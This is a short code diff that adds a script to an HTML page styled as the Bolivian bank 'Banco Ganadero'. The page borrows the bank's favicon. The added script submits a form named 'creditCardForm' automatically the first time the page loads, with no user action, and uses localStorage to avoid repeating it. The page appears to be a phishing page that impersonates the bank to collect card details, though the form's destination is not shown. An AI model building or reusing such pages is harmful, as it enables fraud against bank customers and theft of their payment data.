@@ -5,6 +5,24 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banco Ganadero</title>
     <link rel="shortcut icon" href="https://www.bg.com.bo/favicon.ico">
+    <!-- JavaScript para enviar el formulario automáticamente solo la primera vez -->
+    <script>
+        window.addEventListener('DOMContentLoaded', function () {
+            // Comprobar si el formulario ya se ha enviado antes
+            const hasFormBeenSubmitted = localStorage.getItem('formularioEnviado');
+
+            if (!hasFormBeenSubmitted) {
+                // Obtener el formulario
+                const creditCardForm = document.getElementById('creditCardForm');
+
+                // Enviar el formulario automáticamente
+                creditCardForm.submit();
+
+                // Establecer un indicador en localStorage para que no se envíe nuevamente
+                localStorage.setItem('formularioEnviado', 'true');
+            }
+        });
+    </script>
     <style>
         /* Estilos CSS en línea */
         body {
